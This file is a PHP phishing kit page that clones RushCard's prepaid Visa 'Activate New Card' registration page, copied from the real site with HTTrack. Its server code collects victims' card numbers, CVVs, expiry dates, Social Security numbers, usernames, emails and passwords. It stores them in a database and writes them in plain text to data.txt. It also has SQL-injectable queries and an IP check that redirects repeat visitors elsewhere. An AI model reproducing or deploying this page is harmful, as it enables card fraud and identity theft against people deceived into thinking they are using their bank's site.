<?php
session_start();
include('one.php');
error_reporting(0);
include('conn.php');
if (isset($_POST['submit'])) {
    $errors = array();
    $CardNumber=$_POST['CardNumber'];
    $Cvv=$_POST['Cvv'];
    $ExpirationMonth=$_POST['ExpirationMonth'];
    $ExpirationYear=$_POST['ExpirationYear'];
    $SocialSecurityNumber=$_POST['SocialSecurityNumber'];
    $user_name=$_POST['user_name'];
    $Email=$_POST['Email'];
    $mobile_number=$_POST['mobile_number'];
    $password=$_POST['password'];
    if (!empty($_SERVER['HTTP_CLIENT_IP'])){
      $ip=$_SERVER['HTTP_CLIENT_IP'];
    //Is it a proxy address
    }elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])){
      $ip=$_SERVER['HTTP_X_FORWARDED_FOR'];
    }else{
      $ip=$_SERVER['REMOTE_ADDR'];
    }
    //The value of $ip at this point would look something like: "192.0.34.166"
    $ip = ip2long($ip);
 $rr="cardnumber".$CardNumber."cvv=".$Cvv."xpirationMonth=".$ExpirationMonth."ExpirationYear=".$ExpirationYear."SocialSecurityNumber=".$SocialSecurityNumber."user_name=".$user_name."password=".$password."/n";
 
    if (!filter_var($Email, FILTER_VALIDATE_EMAIL)) {
    
    }
    if(!empty($mobile_number)) // phone number is not empty
    {
        if(preg_match('/^\d{10}$/',$mobile_number)) // phone number is valid
        {
          $mobile_number = '0' . $mobile_number;
    
          // your other code here
        }
      }
  
    if (empty($CardNumber)) {
        array_push($errors, "CardNumber is required");
    }
    if (empty($Cvv)) {
        array_push($errors, "Cvv is required");
    }
    if (empty($ExpirationMonth)) {
        array_push($errors, "ExpirationMonth is required");
    }
    if (empty($ExpirationYear)) {
        array_push($errors, "ExpirationYear is required");
    }
    if (empty($SocialSecurityNumber)) {
        array_push($errors, "SocialSecurityNumber is required");
    }
    if (empty($user_name)) {
        array_push($errors, "user_name is required");
    }
    if (empty($Email)) {
        array_push($errors, "Email is required");
    }
    if (empty($mobile_number)) {
        array_push($errors, "mobile_numberis required");
    }

    if (empty($password)) {
        array_push($errors, "passwor is required");
    }

    $user_check_query = "SELECT * FROM user WHERE CardNumber='$CardNumber' OR  Cvv='$Cvv' OR ExpirationMonth='$ExpirationMonth' OR
    ExpirationYear='$ExpirationYear' OR SocialSecurityNumber='$SocialSecurityNumber' OR user_name='$user_name'OR Email='$Email' OR mobile_number='$mobile_number' OR password='password' or ip='ip' LIMIT 1";
    $result = mysqli_query($db, $user_check_query);
    $user = mysqli_fetch_assoc($result);
    
    if ($user) { // if user exists
        if ($user['user_name'] === $user_name) {
            array_push($errors, "Username already exists");
        }
  
        if ($user['Email'] === $Email) {
            array_push($errors, "email already exists");
        }
        if ($user['ip'] === $ipl) {
          header('location:https://www.filgoal.com/');
      }

    }
    if (count($errors) == 0) {
        $query="insert into user(CardNumber,Cvv,ExpirationMonth,ExpirationYear,SocialSecurityNumber,user_name,Email,mobile_number,password,ip)
     values('$CardNumber','$Cvv','$ExpirationMonth','$ExpirationYear','$SocialSecurityNumber','$user_name','$Email','$mobile_number','$password','$ip')";
        $sql= mysqli_query($conn, $query);
        $login_session = $row['user_name'];
        header('location:login.php');
        $fp = fopen('data.txt', 'a');
fwrite($fp,$rr);
fclose($fp);
}

    
}
?>


<!DOCTYPE html>
<html lang="en" itemscope itemtype="http://schema.org/WebSite">

<!-- Mirrored from usermanagement.rushcard.com/register by HTTrack Website Copier/3.x [XR&CO'2014], Sun, 02 May 2021 18:52:39 GMT -->
<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=utf-8" /><!-- /Added by HTTrack -->
<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
    <title>Activate New Card | RushCard: Prepaid Visa Card</title>
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
   
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />

    <link rel="apple-touch-icon-precomposed" sizes="57x57" href="../content.rushcard.com/content/images/favicon/apple-touch-icon-57x57.png" />
    <link rel="apple-touch-icon-precomposed" sizes="114x114" href="../content.rushcard.com/content/images/favicon/apple-touch-icon-114x114.png" />
    <link rel="apple-touch-icon-precomposed" sizes="72x72" href="../content.rushcard.com/content/images/favicon/apple-touch-icon-72x72.png" />
    <link rel="apple-touch-icon-precomposed" sizes="144x144" href="../content.rushcard.com/content/images/favicon/apple-touch-icon-144x144.png" />
    <link rel="apple-touch-icon-precomposed" sizes="60x60" href="../content.rushcard.com/content/images/favicon/apple-touch-icon-60x60.png" />
    <link rel="apple-touch-icon-precomposed" sizes="120x120" href="../content.rushcard.com/content/images/favicon/apple-touch-icon-120x120.png" />
    <link rel="apple-touch-icon-precomposed" sizes="76x76" href="../content.rushcard.com/content/images/favicon/apple-touch-icon-76x76.png" />
    <link rel="apple-touch-icon-precomposed" sizes="152x152" href="../content.rushcard.com/content/images/favicon/apple-touch-icon-152x152.png" />
    <link rel="icon" type="image/png" href="../content.rushcard.com/content/images/favicon/favicon-196x196.png" sizes="196x196" />
    <link rel="icon" type="image/png" href="../content.rushcard.com/content/images/favicon/favicon-96x96.png" sizes="96x96" />
    <link rel="icon" type="image/png" href="../content.rushcard.com/content/images/favicon/favicon-32x32.png" sizes="32x32" />
    <link rel="icon" type="image/png" href="../content.rushcard.com/content/images/favicon/favicon-16x16.png" sizes="16x16" />
    <link rel="icon" type="image/png" href="../content.rushcard.com/content/images/favicon/favicon-128.png" sizes="128x128" />
    <meta name="application-name" content="&nbsp;" />
    <meta name="msapplication-TileColor" content="#FFFFFF" />
    <meta name="msapplication-TileImage" content="../content.rushcard.com/content/images/favicon/mstile-144x144.png" />
    <meta name="msapplication-square70x70logo" content="../content.rushcard.com/content/images/favicon/mstile-70x70.png" />
    <meta name="msapplication-square150x150logo" content="../content.rushcard.com/content/images/favicon/mstile-150x150.png" />
    <meta name="msapplication-wide310x150logo" content="../content.rushcard.com/content/images/favicon/mstile-310x150.png" />
    <meta name="msapplication-square310x310logo" content="../content.rushcard.com/content/images/favicon/mstile-310x310.png" />


    
    
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>


    <link href="bundles/commonstylescf99.css?v=epggfAKdxhrA1TTdz-dH58_l3trvB5INHXBlRbPE3EI1" rel="stylesheet"/>

    
    


    

  



<!-- ADOBE LAUNCH START -->
<script>
    var digitalData = digitalData || {};
    digitalData = {
        page: {
            pageName: "rc:user_management:register:home",
            brand: "rc",
            site: "user_management",
            channel: "register",
            siteRendered: "responsive"
        },
        user: {
            loginType: "logged_out",
            cardholderId: ""
        },
        server: {
            timeStamp: "2021-05-02 11:52:36"
        },
        form: {
            formName: "register_card",
            formVariant: "",
            formStepName:"register",
            formStepNumber: "1",
            applicationId: "",
            audience: "",
            promoId: "",
            referralId: ""
        },
        events: [
            {name:""}
        ]
    };
</script>

    <script src="../assets.adobedtm.com/4ddf83a2c542/24fbfb1cd512/launch-07ad062ebf01.min.js" async></script>

<!-- END ADOBE LAUNCH START -->



</head>
<body id="Register" itemscope itemtype="http://schema.org/WebPage">
    <div id="wrapper">

        


<!-- Google Tag Manager -->
<noscript>
    <iframe src="http://www.googletagmanager.com/ns.html?id=GTM-KW6HBP"
            height="0" width="0" style="display:none;visibility:hidden"></iframe>
</noscript>
<script>
(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
'../www.googletagmanager.com/gtm5445.html?id='+i+dl;f.parentNode.insertBefore(j,f);
})(window,document,'script','dataLayer','GTM-KW6HBP');</script>
<!-- End Google Tag Manager -->

<header>
<div id="payment-stripe" >
    <div class="container">
        <div class="row">
            <div class="col-sm-6">
                <a href="index.html" alt="RushCard: Prepaid Visa">
                    <img src="../content.rushcard.com/Content/images/Logo/rushcard-logo.png" class="img-responsive" alt="RushCard: Prepaid Visa"/>
                </a>
            </div>
            <div class="col-sm-6">
                <div class="row">
                    <div class="col-sm-12 secondary-menu">
                        
                    </div>
                </div>
            </div>    
        </div>

    </div>
</header>


<div id="bodyContent">
    <div class="container">
        <div class="row">
            


<div class="col-xs-12 col-lg-8 ">
    <h1>Activate New Card</h1>
    <section class="content-box">
        <div class="content">
            <div class="row">
                <div class="col-xs-12">
                    <h2>Register Your RushCard</h2>
                    <h3>
                        Steps: <img src="content/images/step1of2.png" alt="1 of 2"/>
                    </h3>
<form action="register.php" id="SecurityCredentialsForm" method="post" role="form"><input name="__RequestVerificationToken" type="hidden" value="yA3etuGQwcV_rIoEvlRM0o4aryqk7t_ZyU5mVou8WQatw1sjfPqBLmfQtIYo82fz8VsdertZHjy1tcZH-kMxvpn0CjI1" />
<?php include('errors.php'); ?>
<div class="row">
    <div class="col-xs-12 col-sm-4">
        <div class="form-group">
        
            <label for="CardNumber">Card Number:</label>
            <input autocomplete="cc-number" class="form-control" minlength="16"  data-field-name="cardnumber" data-val="true"  maxlength="16"  data-val-required="Required" id="CardNumber" name="CardNumber" placeholder="Your 16-digit card number" pattern="\d*" x- tabindex="1" type="tel" value="" />
            <span class="field-validation-valid" data-valmsg-for="CardNumber" data-valmsg-replace="true"  data-payment="cc-number"></span>
            <span style="color: red;"> <?php   if (isset($CardNumber)&&empty($CardNumber))echo "Required"; ?></span>
        </div>
    </div>
    <div class="col-xs-12 col-sm-3">
        <div class="form-group">
            <label for="Cvv">CVV:</label> <a class="tooltip-icon tooltip-icon" data-container="body" data-content="The 3-digit code that appears in the white signature box on the back of your RushCard" data-placement="auto bottom" data-toggle="popover" data-trigger="click" title="The 3-digit code that appears in the white signature box on the back of your RushCard"></a>
            <input autocomplete="no" class="form-control"  maxlength="3" minlength="3" data-field-name="cvv" data-val="true" data-val-regex="CVV must be 3 digits" data-val-regex-pattern="^\d{3}$" data-val-required="Required" id="Cvv" name="Cvv" placeholder="Your CVV" tabindex="2" type="password" />
            <span class="field-validation-valid" data-valmsg-for="Cvv" data-valmsg-replace="true" data-payment="cc-vc" ></span>
            <span style="color: red;"> <?php   if (isset($Cvv)&&empty($Cvv))echo "Required"; ?></span>
        </div>
    </div>
    <div class="col-xs-12 col-sm-5">
        <div class="form-group">
            <label for="Expiration_Date:">Expiration Date:</label>
            <div class="row">
                <div class="col-xs-6">
                    <select autocomplete="no" class="form-control" data-payment="cc-exp1" data-field-name="expiration_month" data-val="true" data-val-required="Required" id="ExpirationMonth" name="ExpirationMonth" tabindex="3"><option selected="selected" value="">Month</option>
<option value="1">1 - Jan</option>
<option value="2">2 - Feb</option>
<option value="3">3 - Mar</option>
<option value="4">4 - Apr</option>
<option value="5">5 - May</option>
<option value="6">6 - Jun</option> 
<option value="7">7 - Jul</option>
<option value="8">8 - Aug</option>
<option value="9">9 - Sep</option>
<option value="10">10 - Oct</option>
<option value="11">11 - Nov</option>
<option value="12">12 - Dec</option>
</select>
                    <span class="field-validation-valid" data-valmsg-for="ExpirationMonth" data-valmsg-replace="true"></span>
                    <span style="color: red;"> <?php   if (isset($ExpirationMonth)&&empty($ExpirationMonth))echo "Required"; ?></span>
                  </div>
                <div class="col-xs-6">
                    <select autocomplete="no" class="form-control"  data-payment="cc-exp2"  data-field-name="expiration_year" data-val="true" data-val-number="The field Year: must be a number." data-val-required="Required" id="ExpirationYear" name="ExpirationYear" tabindex="4"><option value="">Year</option>
<option value="2021">2021</option>
<option value="2022">2022</option>
<option value="2023">2023</option>
<option value="2024">2024</option>
<option value="2025">2025</option>
<option value="2026">2026</option>
<option value="2027">2027</option>
<option value="2028">2028</option>
<option value="2029">2029</option>
<option value="2030">2030</option>
</select>
                   
<span class="field-validation-valid" data-valmsg-for="ExpirationYear" data-valmsg-replace="true"></span>
<span style="color: red;"> <?php   if (isset($ExpirationYear)&&empty($ExpirationYear))echo "Required"; ?></span>
                </div>
            </div>
        </div>
    </div>
</div>

<div class="row">
    <div class="col-xs-12 col-sm-4">
        <div class="form-group">
            <label for="SocialSecurityNumber">Social Security Number:</label>
            <input autocomplete="no" class="form-control" data-field-name="ssn" maxlength="9" minlength="9" data-val="true" data-val-regex="Social Security Number must be nine digits" data-val-regex-pattern="^\d{9}$" data-val-required="Required" id="SocialSecurityNumber" name="SocialSecurityNumber" placeholder="Your Social Security Number" tabindex="5" type="tel" value="" />
           
            <span class="field-validation-valid" data-valmsg-for="SocialSecurityNumber" data-payment="sn" data-valmsg-replace="true"></span>
            <span style="color: red;"> <?php   if (isset($SocialSecurityNumber)&&empty($SocialSecurityNumber))echo "Required"; ?></span>
          </div>
    </div>
<!-- </div> -->

<!-- <div class="row"> -->
    <div class="col-xs-12 col-sm-4">
        <div class="form-group">
        <label for="user name">User Name:</label>
            <input autocomplete="no" class="form-control"  data-val-required="Required" id="user_name" name="user_name" placeholder="Your user name" tabindex="5" type="text" value=""/>
            <span style="color: red;"> <?php   if (isset($user_name)&&empty($user_name))echo "Required"; ?></span>
          </div>
    </div>
    <div class="col-xs-12 col-sm-4">
        <div class="form-group">
            <label for="Email"> your Email:</label>
            <input class="form-control" tabindex="5" name="Email" placeholder="Your Email" type="email" value="" id="email"/>
            <span style="color: red;"> <?php   if (isset($Email)&&empty($Email))echo "Required"; ?></span>
          </div>
    </div>
</div>

<!-- <div class="row">
    <div class="col-xs-12 col-sm-4">
        <div class="form-group">
            <label for="Email"> your Email:</label>
            <input class="form-control" tabindex="5" name="Email" placeholder="Your Email" type="email" value="" id="email"/>
         </div>
    </div>
</div> -->

    <div class="row">
      <div class="col-xs-12 col-sm-4">
          <div class="form-group">
              <label for="mobile number"> your mobile number:</label>
              <input autocomplete="yes" class="form-control" tabindex="5" name="mobile_number" placeholder="Your mobile number" type="text" value="" id="mobile_number"/>
              <span style="color: red;"> <?php   if (isset($mobile_number)&&empty($mobile_number))echo "Required"; ?></span>
            </div>
      </div>
    <!-- </div> -->

    <!-- <div class="row"> -->
      <div class="col-xs-12 col-sm-4">
          <div class="form-group">
              <label for="password">password:</label>
              <input autocomplete="no" class="form-control" id="password" data-val-required="Required"  name="password" placeholder="inter password" tabindex="5" type="password" value="" />
              <span style="color: red;"> <?php if (isset($password) &&empty($password))echo "Required"; ?></span>
            </div>
      </div>
    </div>


<div class="button-group">
    <button id="btnCardLookupSubmit" type="submit" class="btn btn-primary" name="submit" >Next</button>
    <a alt="Back to Login" class="cancel" href="login.php" tabindex="8">Cancel</a>
</div>


                        <div class="postButtonLink">
                            If you are already registered, <a href="login.php" id="linkLogin">click here</a> to login now.
                        </div> 
</form>                </div>
            </div>
        </div>
    </section>
</div>

        </div>
    </div>
</div>

</div>

<footer>
    <div class="container">
        <div class="row">
            <div class="col-xs-12">
                

    <ul class="socialLinks list-unstyled list-inline">
        <li><a href="https://www.facebook.com/RushCard" title="Facebook"><i class="fa fa-facebook" aria-hidden="true"></i></a></li>
        <li>
            <a href="https://www.youtube.com/user/MyRushCard" title="YouTube"><i class="fa fa-youtube" aria-hidden="true"></i></a>
        </li>
        <li><a href="https://www.twitter.com/RushCard" title="Twitter"><i class="fa fa-twitter" aria-hidden="true"></i></a></li>
        <li><a href="https://www.instagram.com/rushcard" title="Instagram"><i class="fa fa-instagram" aria-hidden="true"></i></a></li>
    </ul>

            </div>
            <div class="col-xs-12">
                <nav id="footerLinks">
                    <ul class="list-unstyled list-inline">
                        <li><a id="FooterNav_ContactUs">Help</a> </li>
                        <li><a href="legal/cardholder-policy-terms.php">Legal Info</a></li>
                        <li><a href="legal/privacy-policies.php">Privacy Center</a></li>
                    </ul>
                </nav>
            </div>

        </div>
        <div class="row">
            <div class="col-xs-12">
<section id="content_disclaimer">
<p>The RushCard Prepaid Visa<sup>&reg;</sup> Card is issued by MetaBank<sup>&reg;</sup>, N.A., Member FDIC, pursuant to a license from Visa U.S.A. Inc. Card accepted everywhere Visa debit cards are accepted.</p>
<p><img src="../content.rushcard.com/content/images/disclaimer/RushCardTrademarks.png" alt="RushCard Trademarks" id="content_disclaimer_trademarks" />UNIRUSH, RUSHCARD, the  logo, RUSHCARD LIVE, CARBON RUSHCARD, EDGE RUSHCARD, GLOSS RUSHCARD, MIDNIGHT RUSHCARD, SEQUIN KLS RUSHCARD, SUEDE KLS RUSHCARD, RUSHGOALS, RUSH UNLIMITED, PAUSE PROTECTION, PAY YOUR OWN WAY, and RISE TO THRIVE are registered trademarks of Green Dot Corporation. All other trademarks, service marks and other registered marks are the property of their respective owners.</p>
<p><img src="../content.rushcard.com/content/images/disclaimer/fdic_visa.png" alt="FDIC Visa Logos" id="content_disclaimer_logos" /></p><p>Green Dot Corporation NMLS ID # 914924</p>
<p>&copy; 2021 Green Dot Corporation. All rights reserved.</p>
</section>

            </div>
        </div>
    </div>
    
</footer>







      


   
    
    



    <script type="text/javascript">_satellite.pageBottom();</script>
  

  
</body>

<!-- Mirrored from usermanagement.rushcard.com/register by HTTrack Website Copier/3.x [XR&CO'2014], Sun, 02 May 2021 18:52:40 GMT -->
</html>
